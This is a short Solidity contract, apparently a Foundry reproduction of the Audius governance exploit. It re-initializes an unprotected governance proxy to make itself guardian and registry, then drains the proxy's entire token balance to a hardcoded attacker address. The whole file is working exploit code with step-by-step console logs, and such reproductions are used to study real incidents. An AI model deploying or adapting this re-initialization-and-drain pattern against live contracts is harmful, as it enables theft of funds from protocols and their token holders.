// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IGovernance.sol";
import "./IERC20.sol";
import "../lib/forge-std/src/console.sol";

contract Runner {
    IERC20 private constant audiusToken =
        IERC20(0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998);
    IGovernance private constant governanceProxy =
        IGovernance(0x4DEcA517D6817B6510798b7328F2314d3003AbAC);

    address private constant attacker = 0xa0c7BD318D69424603CBf91e9969870F21B8ab4c;

    function run() external {
        require(msg.sender == attacker);

        uint256 tokenAmount = audiusToken.balanceOf(address(governanceProxy));
        require(tokenAmount > 0, "no tokens at governance proxy");

        // except for both registry and guardian address
        // the rest of the arguments passed to `initialize` are practically irrelevant for this version of the attack
        governanceProxy.initialize(
            address(this), // registry
            1, // voting period (must be > 0)
            0, // execution delay
            1, // voting quorum percent (must be > 0)
            1, // max in progress proposals (must be > 0)
            address(this) // guardian address
        );

        require(
            governanceProxy.getGuardianAddress() == address(this),
            "Not guardian yet"
        );
        require(
            governanceProxy.getRegistryAddress() == address(this),
            "Not registry address yet"
        );
        console.log("1. re-initialized governance becoming guardian");

        governanceProxy.guardianExecuteTransaction(
            bytes32(0), // key that will be looked up at `getContract` function
            0, // call value
            "transfer(address,uint256)", // function signature to be executed at target address
            abi.encode( // calldata
                msg.sender,
                tokenAmount
            )
        );

        require(
            audiusToken.balanceOf(msg.sender) == tokenAmount,
            "unexpected token balance"
        );
        require(
            audiusToken.balanceOf(address(governanceProxy)) == 0,
            "unexpected token balance in governance"
        );
        console.log("2. attacker account received tokens");
    }

    function getContract(bytes32) external pure returns (address) {
        // called back from Governance during guardian tx execution
        return address(audiusToken);
    }
}
